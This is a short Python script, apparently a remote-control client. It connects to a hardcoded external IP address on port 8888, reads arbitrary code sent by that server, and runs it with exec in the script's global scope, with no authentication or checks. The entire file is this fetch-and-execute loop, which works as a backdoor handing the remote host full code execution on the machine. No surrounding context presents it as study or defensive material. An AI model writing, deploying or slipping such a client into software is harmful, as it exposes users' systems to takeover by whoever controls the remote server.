import net.CommuHandler as ch
import asyncio

def executeCode(code):
    code_obj = compile(code, '<string>', 'exec')
    exec(code_obj, globals())

async def eventHandle(reader, writer):
    code = await reader.read()
    executeCode(code.decode())
    writer.close()
    await writer.wait_closed()

client = ch.ClientHandler('52.78.166.156', 8888)
asyncio.run(client.start(eventHandle))
